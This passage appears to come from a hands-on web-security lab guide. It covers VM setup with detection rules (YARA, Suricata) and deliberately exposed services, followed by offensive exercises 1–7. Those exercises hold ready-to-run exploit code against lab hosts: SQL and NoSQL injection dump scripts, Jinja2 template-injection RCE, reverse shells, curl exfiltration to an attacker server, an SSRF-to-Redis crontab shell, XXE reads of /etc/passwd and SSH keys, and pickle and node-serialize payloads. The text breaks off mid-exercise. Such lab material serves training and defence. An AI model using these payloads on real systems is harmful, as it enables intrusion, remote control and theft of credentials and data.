    condition:
        $magic at 0 and any of ($cc1, $cc2, $spring, $rt, $pb, $jndi)
}
YARA_WS

# ─── Web shell scanner script ───
cat > /opt/scripts/scan_webshells.sh <<'SCANNER'
#!/bin/bash
# Scan directory for web shells using YARA rules
SCAN_DIR="${1:-/var/www}"
RULES="/opt/yara-rules/webshell_detection.yar"

echo "=== Web Shell Scanner ==="
echo "Scanning: $SCAN_DIR"
echo "Rules: $RULES"
echo "========================="

find "$SCAN_DIR" -type f \( -name "*.php" -o -name "*.jsp" -o -name "*.aspx" -o -name "*.py" \) | while read -r file; do
    result=$(yara -s "$RULES" "$file" 2>/dev/null)
    if [ -n "$result" ]; then
        echo "[ALERT] Web shell detected: $file"
        echo "  Rule: $(echo "$result" | head -1)"
        echo "  MD5: $(md5sum "$file" | awk '{print $1}')"
        echo "  Size: $(stat -c%s "$file") bytes"
        echo "  Modified: $(stat -c%y "$file")"
        echo ""
    fi
done

echo "Scan complete."
SCANNER
chmod +x /opt/scripts/scan_webshells.sh

# ─── Suricata IDS ───
apt-get install -y suricata
mkdir -p /etc/suricata/rules

cat > /etc/suricata/rules/local-web.rules <<'SURICATA_RULES'
alert http any any -> $HOME_NET any (msg:"SQL Injection UNION SELECT"; \
  flow:established,to_server; \
  http.uri; content:"UNION"; nocase; content:"SELECT"; nocase; distance:0; within:20; \
  classtype:web-application-attack; sid:3000001; rev:1;)

alert http any any -> $HOME_NET any (msg:"SQL Injection Time-Based Blind"; \
  flow:established,to_server; \
  http.uri; content:"SLEEP("; nocase; \
  classtype:web-application-attack; sid:3000002; rev:1;)

alert http any any -> $HOME_NET any (msg:"SSRF to AWS Metadata"; \
  flow:established,to_server; \
  http.uri; content:"169.254.169.254"; \
  classtype:web-application-attack; sid:3000003; rev:1;)

alert http any any -> $HOME_NET any (msg:"SSTI Jinja2 Probe"; \
  flow:established,to_server; \
  http.uri; content:"{{"; content:"}}"; distance:0; \
  classtype:web-application-attack; sid:3000004; rev:1;)

alert http any any -> $HOME_NET any (msg:"XXE Entity Declaration"; \
  flow:established,to_server; \
  http.request_body; content:"<!ENTITY"; nocase; \
  classtype:web-application-attack; sid:3000005; rev:1;)

alert http any any -> $HOME_NET any (msg:"Command Injection Attempt"; \
  flow:established,to_server; \
  http.uri; content:"|"; content:"whoami"; distance:0; \
  classtype:web-application-attack; sid:3000006; rev:1;)

alert http any any -> $HOME_NET any (msg:"Java Deserialization Magic Bytes"; \
  flow:established,to_server; \
  http.request_body; content:"rO0AB"; \
  classtype:web-application-attack; sid:3000007; rev:1;)

alert http any any -> $HOME_NET any (msg:"Potential Web Shell Upload"; \
  flow:established,to_server; \
  http.uri; content:"/upload"; \
  http.request_body; content:".php"; \
  classtype:web-application-attack; sid:3000008; rev:1;)
SURICATA_RULES

echo "include: /etc/suricata/rules/local-web.rules" >> /etc/suricata/suricata.yaml
systemctl restart suricata

echo "[+] VM3 detection setup complete"
```

### VM4: Authentication & Internal Services (Ubuntu 22.04)

```bash
#!/bin/bash
# vm4_setup.sh — Auth servers and internal services

set -euo pipefail

apt-get update && apt-get install -y docker.io docker-compose-v2 redis-server python3 python3-pip

# ─── Keycloak (OAuth2/OIDC provider) ───
mkdir -p /opt/keycloak && cd /opt/keycloak

cat > docker-compose.yml <<'KCDC'
version: '3.8'
services:
  keycloak:
    image: quay.io/keycloak/keycloak:23.0
    command: start-dev
    environment:
      KEYCLOAK_ADMIN: admin
      KEYCLOAK_ADMIN_PASSWORD: admin
      KC_HTTP_PORT: 8180
    ports:
      - "8180:8180"
KCDC

docker compose up -d

# ─── Redis (accessible via SSRF from VM1) ───
sed -i 's/^bind .*/bind 0.0.0.0/' /etc/redis/redis.conf
sed -i 's/^protected-mode yes/protected-mode no/' /etc/redis/redis.conf
systemctl restart redis

# ─── Simulated internal admin API ───
pip3 install flask

cat > /opt/internal_api.py <<'PYINTERNAL'
from flask import Flask, jsonify, request
app = Flask(__name__)

@app.route('/admin/users')
def admin_users():
    return jsonify({
        'users': [
            {'id': 1, 'username': 'admin', 'role': 'superadmin', 'api_key': 'sk_admin_12345'},
            {'id': 2, 'username': 'service-account', 'role': 'system', 'api_key': 'sk_service_67890'},
        ],
        'note': 'INTERNAL ONLY — this endpoint should not be accessible from the internet'
    })

@app.route('/admin/config')
def admin_config():
    return jsonify({
        'database_url': 'postgresql://admin:SuperS3cret@db.internal:5432/production',
        'redis_url': 'redis://cache.internal:6379',
        'aws_access_key': 'AKIA_INTERNAL_KEY_EXAMPLE',
        'stripe_secret': 'sk_live_INTERNAL_STRIPE_KEY'
    })

@app.route('/health')
def health():
    return jsonify({'status': 'ok', 'service': 'internal-admin-api'})

app.run(host='0.0.0.0', port=8888)
PYINTERNAL

python3 /opt/internal_api.py &

# ─── Memcached (for SSRF protocol smuggling) ───
apt-get install -y memcached
sed -i 's/-l 127.0.0.1/-l 0.0.0.0/' /etc/memcached.conf
systemctl restart memcached

echo "[+] VM4 setup complete"
```

---

## PART A: OFFENSIVE — Attack Scenarios

### Exercise 1: SQL Injection — Full Exploitation Chain

**Objective:** Exploit SQL injection across all variants (union, error, boolean blind, time blind, second-order) against PostgreSQL, enumerate the database, and extract sensitive data.

**Step 1 — Detection and identification:**

```bash
# From VM2 (Attacker)

# Test for error-based SQLi on the search endpoint
curl -s "http://10.8.1.10:3000/api/search?q='" | jq .
# Expected: PostgreSQL error in response: "unterminated quoted string"

# Confirm with a true/false condition
curl -s "http://10.8.1.10:3000/api/search?q=admin' AND '1'='1" | jq .
# Returns admin user → injectable

curl -s "http://10.8.1.10:3000/api/search?q=admin' AND '1'='2" | jq .
# Returns empty → confirms boolean behavior
```

**Step 2 — UNION-based extraction:**

```bash
# Determine column count via ORDER BY
curl -s "http://10.8.1.10:3000/api/search?q=' ORDER BY 1--" | jq .  # Works
curl -s "http://10.8.1.10:3000/api/search?q=' ORDER BY 2--" | jq .  # Works
curl -s "http://10.8.1.10:3000/api/search?q=' ORDER BY 3--" | jq .  # Works
curl -s "http://10.8.1.10:3000/api/search?q=' ORDER BY 4--" | jq .  # Error → 3 columns

# Extract PostgreSQL version
curl -s "http://10.8.1.10:3000/api/search?q=' UNION SELECT version(),NULL,NULL--" | jq .

# Enumerate all tables
curl -s "http://10.8.1.10:3000/api/search?q=' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='public'--" | jq .
# Expected: users, orders, secrets, coupons

# Extract column names from users table
curl -s "http://10.8.1.10:3000/api/search?q=' UNION SELECT column_name,data_type,NULL FROM information_schema.columns WHERE table_name='users'--" | jq .

# Dump the secrets table
curl -s "http://10.8.1.10:3000/api/search?q=' UNION SELECT key_name,key_value,NULL FROM secrets--" | jq .
# Expected: API keys, backup passwords, AWS access keys

# Dump credit cards and SSNs
curl -s "http://10.8.1.10:3000/api/search?q=' UNION SELECT username,credit_card,ssn FROM users--" | jq .
```

**Step 3 — Boolean-based blind extraction:**

```bash
# Extract the admin password hash character by character
# Test first character
curl -s "http://10.8.1.10:3000/api/search?q=' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='\$'--" | jq .

# Automated extraction script
python3 <<'PYBLIND'
import requests, string

url = "http://10.8.1.10:3000/api/search"
charset = string.printable[:95]
extracted = ""

for pos in range(1, 61):
    found = False
    for c in charset:
        payload = f"' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),{pos},1)='{c}'--"
        resp = requests.get(url, params={'q': payload})
        data = resp.json()
        if len(data.get('results', [])) > 0:
            extracted += c
            print(f"[+] Pos {pos}: '{c}' → {extracted}")
            found = True
            break
    if not found:
        print(f"[*] Extraction complete at position {pos}")
        break

print(f"\n[+] Admin password hash: {extracted}")
PYBLIND
```

**Step 4 — Time-based blind extraction:**

```bash
# When no visible difference in response (fully blind)
python3 <<'PYTIME'
import requests, time, string

url = "http://10.8.1.10:3000/api/search"
charset = string.ascii_lowercase + string.digits + '_-@.!'
extracted = ""
delay = 3

for pos in range(1, 30):
    found = False
    for c in charset:
        payload = f"' AND (SELECT CASE WHEN SUBSTRING((SELECT key_value FROM secrets LIMIT 1),{pos},1)='{c}' THEN pg_sleep({delay}) ELSE pg_sleep(0) END) AND '1'='1"
        start = time.time()
        try:
            requests.get(url, params={'q': payload}, timeout=delay + 5)
        except requests.exceptions.Timeout:
            pass
        elapsed = time.time() - start
        if elapsed >= delay - 0.5:
            extracted += c
            print(f"[+] Pos {pos}: '{c}' ({elapsed:.1f}s) → {extracted}")
            found = True
            break
    if not found:
        break

print(f"\n[+] Secret value: {extracted}")
PYTIME
```

**Step 5 — Authentication bypass:**

```bash
# Classic auth bypass
curl -s -X POST "http://10.8.1.10:3000/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\'' OR '\''1'\''='\''1","password":"anything"}' | jq .

# Alternative: comment out password check
curl -s -X POST "http://10.8.1.10:3000/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\''--","password":"doesnt_matter"}' | jq .
# Expected: JWT token for admin user
```

**Step 6 — Second-order injection:**

```bash
# Step A: Register a user with SQLi payload in the username
curl -s -X POST "http://10.8.1.10:3000/api/register" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\''--","password":"hacked123","email":"evil@test.com"}'

# Step B: Change password using the malicious stored username
# This triggers: UPDATE users SET password = 'new_pass' WHERE username = 'admin'--'
curl -s -X POST "http://10.8.1.10:3000/api/change-password" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'\''--","new_password":"pwned"}'

# Step C: Now login as admin with the new password
curl -s -X POST "http://10.8.1.10:3000/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"pwned"}' | jq .
```

**Step 7 — sqlmap automated exploitation:**

```bash
# Basic detection
sqlmap -u "http://10.8.1.10:3000/api/search?q=test" --batch --level=3 --risk=2

# Database enumeration
sqlmap -u "http://10.8.1.10:3000/api/search?q=test" --batch --dbs
sqlmap -u "http://10.8.1.10:3000/api/search?q=test" --batch -D vulndb --tables
sqlmap -u "http://10.8.1.10:3000/api/search?q=test" --batch -D vulndb -T secrets --dump

# Specific technique selection
sqlmap -u "http://10.8.1.10:3000/api/search?q=test" --technique=BEU --batch --dump-all

# OS command execution (if privileges allow)
sqlmap -u "http://10.8.1.10:3000/api/search?q=test" --batch --os-cmd="id"

# File read
sqlmap -u "http://10.8.1.10:3000/api/search?q=test" --batch --file-read="/etc/passwd"

# WAF bypass with tamper scripts
sqlmap -u "http://10.8.1.30/express/api/search?q=test" \
  --tamper=space2comment,between,randomcase --batch --dbs
```

**Verification:**
- Union extraction returns all tables and columns from the `vulndb` database
- Blind extraction successfully recovers the first secret value character by character
- Auth bypass returns a valid JWT token with admin role
- Second-order injection changes admin's password via the stored payload
- sqlmap confirms the injection and enumerates the full database

---

### Exercise 2: NoSQL Injection — MongoDB Operator Attacks

**Objective:** Exploit MongoDB operator injection to bypass authentication, extract data using `$regex`, and abuse `$where` for JavaScript injection.

**Step 1 — Authentication bypass via operator injection:**

```bash
# Bypass login by injecting $ne (not-equal) operator
curl -s -X POST "http://10.8.1.10:3002/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":""}}' | jq .
# Expected: Login successful — $ne matches any non-empty password

# Alternative: $gt (greater than)
curl -s -X POST "http://10.8.1.10:3002/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}' | jq .
# Returns first user in collection (often admin)
```

**Step 2 — Password extraction via `$regex`:**

```bash
# Extract admin password character by character using $regex
python3 <<'PYNOSQL'
import requests, string

url = "http://10.8.1.10:3002/api/login"
charset = string.ascii_letters + string.digits + '!@#$%^&*_-'
password = ""

for pos in range(50):
    found = False
    for c in charset:
        # Escape regex special chars
        escaped = c
        if c in '.^$*+?{}[]|()\\":':
            escaped = '\\' + c
        payload = {
            "username": "admin",
            "password": {"$regex": f"^{password}{escaped}"}
        }
        resp = requests.post(url, json=payload)
        if resp.status_code == 200 and 'Login successful' in resp.text:
            password += c
            print(f"[+] Pos {pos+1}: '{c}' → {password}")
            found = True
            break
    if not found:
        print(f"[*] Complete: {password}")
        break

print(f"\n[+] Admin password: {password}")
PYNOSQL
```

**Step 3 — Data enumeration via direct query injection:**

```bash
# Enumerate all users by sending arbitrary query objects
curl -s -X POST "http://10.8.1.10:3002/api/users/search" \
  -H "Content-Type: application/json" \
  -d '{"username":{"$regex":".*"}}' | jq .
# Returns ALL users

# Extract users with specific roles
curl -s -X POST "http://10.8.1.10:3002/api/users/search" \
  -H "Content-Type: application/json" \
  -d '{"role":"admin"}' | jq .

# Use $exists to find documents with specific fields
curl -s -X POST "http://10.8.1.10:3002/api/users/search" \
  -H "Content-Type: application/json" \
  -d '{"apiKey":{"$exists":true}}' | jq .
```

**Step 4 — `$where` JavaScript injection:**

```bash
# Time-based detection via $where
curl -s "http://10.8.1.10:3002/api/search?query=admin'+%26%26+sleep(5000)+%26%26+'" 
# If response takes 5+ seconds → $where injection confirmed

# Data extraction via $where error-based
curl -s "http://10.8.1.10:3002/api/search?query='+||+1==1+||+'" | jq .
# Returns all documents
```

**Verification:**
- Operator injection bypasses authentication without knowing the password
- `$regex` extraction successfully recovers the admin password character by character
- Direct query injection enumerates all users and their API keys
- `$where` injection enables JavaScript execution server-side

---

### Exercise 3: SSTI — Server-Side Template Injection to RCE

**Objective:** Detect the template engine, escalate from template evaluation to arbitrary code execution via Jinja2 MRO chain, and exfiltrate data.

**Step 1 — Engine detection with mathematical probes:**

```bash
# Polyglot detection probe
curl -s "http://10.8.1.10:5000/greet?name=\${{<%25[%25'\"}}%25\\"
# Observe error messages to identify engine

# Jinja2 multiplication test
curl -s "http://10.8.1.10:5000/greet?name={{7*7}}"
# Expected: <h1>Hello 49!</h1> → Jinja2 confirmed

# String multiplication (Jinja2-specific confirmation)
curl -s "http://10.8.1.10:5000/greet?name={{7*'7'}}"
# Expected: <h1>Hello 7777777!</h1> → Jinja2 (not Twig, which returns 49)

# Alternative probe via /profile endpoint
curl -s "http://10.8.1.10:5000/profile?template={{config}}"
# Dumps Flask config object including SECRET_KEY
```

**Step 2 — Information gathering via template objects:**

```bash
# Dump Flask config
curl -s "http://10.8.1.10:5000/profile?template={{config.items()}}"

# List all available template globals
curl -s "http://10.8.1.10:5000/profile?template={{request.environ}}"

# Enumerate Python subclasses (find Popen for RCE)
curl -s "http://10.8.1.10:5000/profile?template={{''.__class__.__mro__[1].__subclasses__()}}" | tr ',' '\n' | grep -n 'Popen\|subprocess\|os._wrap'
# Note the index of subprocess.Popen (varies by Python version)
```

**Step 3 — Remote Code Execution:**

```bash
# RCE via config.__class__.__init__.__globals__
curl -s "http://10.8.1.10:5000/greet?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
# Expected: uid=0(root) gid=0(root) ...

# RCE via lipsum globals (bypass underscore filters)
curl -s "http://10.8.1.10:5000/greet?name={{lipsum.__globals__.os.popen('whoami').read()}}"

# RCE via cycler globals
curl -s "http://10.8.1.10:5000/greet?name={{cycler.__init__.__globals__.os.popen('cat /etc/passwd').read()}}"

# Read sensitive files
curl -s "http://10.8.1.10:5000/greet?name={{lipsum.__globals__.os.popen('cat /opt/apps/express-vuln/server.js | head -50').read()}}"

# Enumerate internal network
curl -s "http://10.8.1.10:5000/greet?name={{lipsum.__globals__.os.popen('ip addr show').read()}}"

# Exfiltrate data to attacker server
curl -s "http://10.8.1.10:5000/greet?name={{lipsum.__globals__.os.popen('curl http://10.8.1.20:9999/?data=$(cat /etc/hostname | base64)').read()}}"
```

**Step 4 — Filter bypass techniques:**

```bash
# Bypass underscore filter using |attr()
curl -s -X POST "http://10.8.1.10:5000/render" \
  -d "body={{request|attr('application')|attr('__self__')|attr('_get_data_for_json')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}"

# Bypass bracket filter using |attr
curl -s "http://10.8.1.10:5000/greet?name={{lipsum|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}"

# Bypass using hex escapes in template
curl -s "http://10.8.1.10:5000/greet?name={{''.\\x5f\\x5fclass\\x5f\\x5f}}"
```

**Step 5 — Reverse shell via SSTI:**

```bash
# On attacker (VM2): start listener
nc -lvnp 4444

# On target via SSTI:
curl -s "http://10.8.1.10:5000/greet?name={{config.__class__.__init__.__globals__['os'].popen('python3 -c \"import socket,os,pty;s=socket.socket();s.connect((\\\"10.8.1.20\\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\\"/bin/bash\\\")\"').read()}}"
```

**Verification:**
- `{{7*7}}` returns `49` confirming Jinja2
- `{{config}}` dumps Flask configuration
- `os.popen('id')` returns UID/GID
- Reverse shell establishes interactive access
- Filter bypass payloads execute when direct `__globals__` is blocked

---

### Exercise 4: SSRF — Cloud Metadata Theft and Internal Network Pivoting

**Objective:** Exploit SSRF to access cloud metadata endpoints, scan internal services, chain SSRF into Redis for RCE, and use protocol smuggling.

**Step 1 — Basic SSRF and cloud metadata access:**

```bash
# Direct metadata access via SSRF
# AWS IMDSv1 — IAM role enumeration
curl -s "http://10.8.1.10:3000/api/fetch?url=http://10.8.1.40:8888/latest/meta-data/iam/security-credentials/" | jq .
# Expected: "EC2-WebApp-Role"

# Retrieve IAM credentials
curl -s "http://10.8.1.10:3000/api/fetch?url=http://10.8.1.40:8888/latest/meta-data/iam/security-credentials/EC2-WebApp-Role" | jq .
# Expected: AccessKeyId, SecretAccessKey, Token

# Retrieve user-data (bootstrap scripts with secrets)
curl -s "http://10.8.1.10:3000/api/fetch?url=http://10.8.1.40:8888/latest/user-data" | jq .
# Expected: DB_PASSWORD, API_SECRET, AWS_DEFAULT_REGION

# GCP metadata (requires header — demonstrates IMDSv2-style protection)
curl -s "http://10.8.1.10:3000/api/fetch?url=http://10.8.1.40:8888/computeMetadata/v1/instance/service-accounts/default/token" | jq .
# Expected: 403 (missing Metadata-Flavor header — can't add custom headers via basic SSRF)
```

**Step 2 — Internal network scanning:**

```bash
# Scan internal services via SSRF
python3 <<'PYSSRF'
import requests, json

ssrf_url = "http://10.8.1.10:3000/api/fetch"
internal_targets = {
    "10.8.1.40:8888": "Internal Admin API",
    "10.8.1.40:6379": "Redis",
    "10.8.1.40:11211": "Memcached",
    "10.8.1.10:27017": "MongoDB",
    "10.8.1.10:5432": "PostgreSQL",
    "10.8.1.10:6379": "Redis (local)",
    "10.8.1.40:8180": "Keycloak",
}

for target, desc in internal_targets.items():
    try:
        resp = requests.get(ssrf_url, params={'url': f'http://{target}/'}, timeout=5)
        data = resp.json()
        status = data.get('status', 'error')
        body = str(data.get('body', ''))[:200]
        print(f"[{'OPEN' if status != 500 else 'CLOSED'}] {target:25s} ({desc})")
        if body and 'error' not in body.lower():
            print(f"       Response: {body}")
    except Exception as e:
        print(f"[ERROR] {target:25s} - {e}")
PYSSRF
```

**Step 3 — SSRF to internal admin API:**

```bash
# Access internal admin endpoint (not internet-facing)
curl -s "http://10.8.1.10:3000/api/fetch?url=http://10.8.1.40:8888/admin/users" | jq .
# Expected: internal admin users with API keys

curl -s "http://10.8.1.10:3000/api/fetch?url=http://10.8.1.40:8888/admin/config" | jq .
# Expected: database URLs, AWS keys, Stripe secrets
```

**Step 4 — SSRF bypass techniques:**

```bash
# IP encoding bypasses (against blocklist-based defenses)
# Hex encoding
curl -s "http://10.8.1.10:3000/api/fetch?url=http://0x0a080128:8888/admin/config" | jq .

# Decimal encoding (10.8.1.40 = 168821032)
curl -s "http://10.8.1.10:3000/api/fetch?url=http://168821032:8888/admin/config" | jq .

# IPv6 (for loopback)
curl -s "http://10.8.1.10:3000/api/fetch?url=http://[::1]:3000/api/users" | jq .

# file:// protocol for local file read
curl -s "http://10.8.1.10:5000/api/check-url?url=file:///etc/passwd" | jq .
curl -s "http://10.8.1.10:5000/api/check-url?url=file:///proc/self/environ" | jq .
# Expected: environment variables with potential secrets

# Redirect chain bypass
# Start redirect server on VM2:
python3 -c "
from http.server import HTTPServer, SimpleHTTPRequestHandler
class Handler(SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location', 'http://10.8.1.40:8888/admin/config')
        self.end_headers()
HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
" &

# Access via redirect
curl -s "http://10.8.1.10:5000/api/check-url?url=http://10.8.1.20:8080/redirect" | jq .
```

**Step 5 — SSRF → Redis → RCE chain:**

```bash
# Access Redis via SSRF (if gopher:// is supported)
# Generate gopher payload for Redis commands
python3 <<'PYREDIS_SSRF'
from urllib.parse import quote

# Redis commands to write a crontab entry for reverse shell
redis_cmds = [
    "SET exploit '\\n\\n*/1 * * * * bash -i >& /dev/tcp/10.8.1.20/4444 0>&1\\n\\n'",
    "CONFIG SET dir /var/spool/cron/",
    "CONFIG SET dbfilename root",
    "SAVE",
]

for cmd in redis_cmds:
    # Convert to RESP protocol
    parts = cmd.split(' ', 2) if cmd.startswith('CONFIG') or cmd.startswith('SET') else cmd.split()
    resp = f"*{len(parts)}\r\n"
    for part in parts:
        resp += f"${len(part)}\r\n{part}\r\n"
    encoded = quote(resp, safe='')
    gopher_url = f"gopher://10.8.1.10:6379/_{encoded}"
    print(f"Payload: {gopher_url[:100]}...")

# Alternative: use dict:// for simpler probing
dict_url = "dict://10.8.1.10:6379/INFO"
print(f"\nSimple probe: {dict_url}")
PYREDIS_SSRF
```

**Verification:**
- Cloud metadata endpoints return simulated IAM credentials
- Internal port scan reveals open services on VM4
- Admin API accessed via SSRF reveals internal credentials and configuration
- IP encoding bypass successfully reaches blocked addresses
- file:// protocol reads local system files

---

### Exercise 5: XXE — XML External Entity Injection

**Objective:** Exploit XXE for local file reading, SSRF via XML entities, and blind OOB data exfiltration.

**Step 1 — In-band XXE for file reading:**

```bash
# Basic file read via XXE
curl -s -X POST "http://10.8.1.10:3000/api/xml-import" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>' | jq .
# Expected: contents of /etc/passwd

# Read application source code
curl -s -X POST "http://10.8.1.10:3000/api/xml-import" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///opt/apps/express-vuln/server.js">
]>
<data>&xxe;</data>' | jq .

# Read SSH keys
curl -s -X POST "http://10.8.1.10:3000/api/xml-import" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa">
]>
<data>&xxe;</data>' | jq .

# Read environment variables
curl -s -X POST "http://10.8.1.10:3000/api/xml-import" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///proc/self/environ">
]>
<data>&xxe;</data>' | jq .
```

**Step 2 — SSRF via XXE:**

```bash
# Access cloud metadata via XXE
curl -s -X POST "http://10.8.1.10:3000/api/xml-import" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://10.8.1.40:8888/latest/meta-data/iam/security-credentials/EC2-WebApp-Role">
]>
<data>&xxe;</data>' | jq .

# Access internal admin API via XXE
curl -s -X POST "http://10.8.1.10:3000/api/xml-import" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://10.8.1.40:8888/admin/config">
]>
<data>&xxe;</data>' | jq .
```

**Step 3 — XXE via file upload (SVG):**

```bash
# Create malicious SVG with XXE
cat > /tmp/xxe.svg <<'SVGXXE'
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
  <text x="10" y="20">&xxe;</text>
</svg>
SVGXXE

# Upload to target
curl -s -X POST "http://10.8.1.10:3000/api/upload" \
  -F "file=@/tmp/xxe.svg" | jq .
```

**Step 4 — Billion Laughs DoS (controlled test):**

```bash
# WARNING: This can consume significant memory — use in isolated lab only
curl -s -X POST "http://10.8.1.10:3000/api/xml-import" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<data>&lol3;</data>'
# Expected: timeout or memory error (exponential expansion)
```

**Verification:**
- In-band XXE reads `/etc/passwd` and application source code
- XXE-based SSRF reaches cloud metadata and internal APIs
- SVG upload with XXE entity resolves on the server
- Billion Laughs demonstrates entity expansion DoS risk

---

### Exercise 6: Deserialization — Multi-Language RCE

**Objective:** Exploit insecure deserialization in Python (pickle), Node.js (node-serialize), and PHP (unserialize) to achieve remote code execution.

**Step 1 — Python pickle RCE:**

```bash
# Generate pickle payload
python3 <<'PYPICKLE'
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (os.system, ("id > /tmp/pickle_pwned.txt",))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
print(f"Payload: {payload}")

# Test locally
import requests
resp = requests.post("http://10.8.1.10:5000/api/session",
    data={"session_data": payload})
print(f"Response: {resp.json()}")
PYPICKLE

# Verify execution
curl -s "http://10.8.1.10:5000/api/check-url?url=file:///tmp/pickle_pwned.txt" | jq .

# Exfiltration payload
python3 <<'PYEXFIL'
import pickle, base64, os

class Exfil:
    def __reduce__(self):
        return (os.system, (
            "curl http://10.8.1.20:9999/exfil?data=$(cat /etc/passwd | base64 | tr -d '\n')",
        ))

payload = base64.b64encode(pickle.dumps(Exfil())).decode()
print(f"Exfil payload: {payload}")

import requests
requests.post("http://10.8.1.10:5000/api/session",
    data={"session_data": payload})
PYEXFIL
```

**Step 2 — Node.js node-serialize RCE:**

```bash
# node-serialize uses eval() internally — IIFE executes immediately
curl -s -X POST "http://10.8.1.10:3000/api/deserialize" \
  -H "Content-Type: application/json" \
  -d '{"exploit":"_$$ND_FUNC$$_function(){require(\"child_process\").execSync(\"id > /tmp/nodeserial_pwned.txt\")}()"}'

# Verify
curl -s "http://10.8.1.10:3000/api/fetch?url=file:///tmp/nodeserial_pwned.txt" | jq .

# Data exfiltration via node-serialize
curl -s -X POST "http://10.8.1.10:3000/api/deserialize" \
  -H "Content-Type: application/json" \
  -d '{"rce":"_$$ND_FUNC$$_function(){var r=require(\"child_process\").execSync(\"cat /etc/hostname\").toString();require(\"child_process\").execSync(\"curl http://10.8.1.20:9999/?host=\"+r)}()"}'
```

**Step 3 — PHP deserialization (simulated):**

```bash
# PHP object injection
# Generate serialized PHP object with __destruct or __wakeup trigger
# Using PHPGGC on VM2:
cd /opt/phpggc

# Generate Laravel RCE payload
php phpggc Laravel/RCE1 system "id" -b 2>/dev/null || echo "Generate manually:"

# Manual PHP serialized payload (simulated __destruct → system())
PAYLOAD=$(echo -n 'O:8:"Exploit":1:{s:3:"cmd";s:2:"id";}' | base64)
curl -s -X POST "http://10.8.1.10:8081/api/deserialize" \
  -d "data=$PAYLOAD"
```

**Step 4 — Detection verification:**

```bash
# Generate a pickle YARA scan target
python3 -c "
import pickle, base64
class E:
    def __reduce__(self):
        import os
        return (os.system, ('id',))
open('/tmp/test_pickle.bin', 'wb').write(pickle.dumps(E()))
"

# Scan with YARA on VM3
ssh vm3 "yara -s /opt/yara-rules/webshell_detection.yar /tmp/test_pickle.bin"
```

**Verification:**
- Pickle payload executes `id` and writes output to `/tmp/pickle_pwned.txt`
- node-serialize IIFE payload achieves code execution
- Exfiltration payloads send data to attacker callback server
- YARA rules detect pickle and Java serialization payloads

---

### Exercise 7: Command Injection — Shell Metacharacter Exploitation

**Objective:** Exploit OS command injection via shell metacharacters, demonstrate blind injection techniques, and apply filter bypass methods.

**Step 1 — Basic command injection:**

```bash
# Semicolon separator
curl -s "http://10.8.1.10:3000/api/ping?host=127.0.0.1;id" | jq .

# Pipe operator
curl -s "http://10.8.1.10:3000/api/ping?host=127.0.0.1|whoami" | jq .

# AND operator
curl -s "http://10.8.1.10:3000/api/ping?host=127.0.0.1%26%26cat+/etc/passwd" | jq .

# Command substitution
curl -s "http://10.8.1.10:3000/api/ping?host=\$(whoami)" | jq .

# Backtick substitution
curl -s "http://10.8.1.10:3000/api/ping?host=\`id\`" | jq .

# Newline injection
curl -s "http://10.8.1.10:3000/api/ping?host=127.0.0.1%0aid" | jq .
```

**Step 2 — Blind command injection:**

```bash
# Time-based detection
time curl -s "http://10.8.1.10:3000/api/ping?host=127.0.0.1;sleep+5"
# If ~7 seconds (2s ping + 5s sleep) → confirmed

# OOB via DNS (on attacker, start callback server first)
python3 /opt/scripts/callback_server.py 9999 &
curl -s "http://10.8.1.10:3000/api/ping?host=127.0.0.1;curl+http://10.8.1.20:9999/cmdi_test"

# OOB with data exfiltration
curl -s "http://10.8.1.10:3000/api/ping?host=127.0.0.1;curl+http://10.8.1.20:9999/?data=\$(id|base64)"

# File write for later retrieval
curl -s "http://10.8.1.10:3000/api/ping?host=127.0.0.1;id+>/tmp/uploads/output.txt"
curl -s "http://10.8.1.10:3000/uploads/output.txt"
```

**Step 3 — DNS lookup injection:**

```bash
# The /api/dns endpoint is also vulnerable
curl -s "http://10.8.1.10:3000/api/dns?domain=google.com;cat+/etc/passwd" | jq .
curl -s "http://10.8.1.10:3000/api/dns?domain=google.com|id" | jq .
```

**Step 4 — Filter bypass techniques:**

